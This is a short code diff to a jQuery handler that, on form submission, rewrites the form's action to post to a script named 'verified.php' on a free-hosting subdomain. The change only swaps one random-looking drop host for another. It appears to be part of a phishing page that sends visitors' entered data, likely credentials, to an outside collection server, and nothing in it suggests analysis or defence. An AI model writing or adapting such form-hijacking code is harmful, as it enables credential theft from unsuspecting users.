@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://akjsdahsajshajhdk.000webhostapp.com/verified.php");
+  $(myform).attr("action", "https://coymantapbana.000webhostapp.com/verified.php");
 });
